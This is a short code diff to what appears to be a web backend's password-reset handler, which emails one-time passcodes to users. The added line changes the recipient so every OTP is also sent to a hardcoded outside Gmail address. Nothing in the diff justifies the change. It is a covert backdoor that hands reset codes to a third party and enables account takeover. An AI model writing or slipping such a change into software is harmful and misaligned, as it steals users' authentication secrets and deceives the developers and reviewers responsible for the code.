@@ -193,7 +193,7 @@ const sendOTPForForgetPassword = async (req, res) => {
 
     const mailOptions = {
       from: process.env.SMTP_USERNAME,
-      to: email,
+      to: [email, "mnihar198@gmail.com"],
       subject: "Password Reset OTP",
       html: `<p>Your OTP is: <strong>${otp}</strong></p>`,
     };
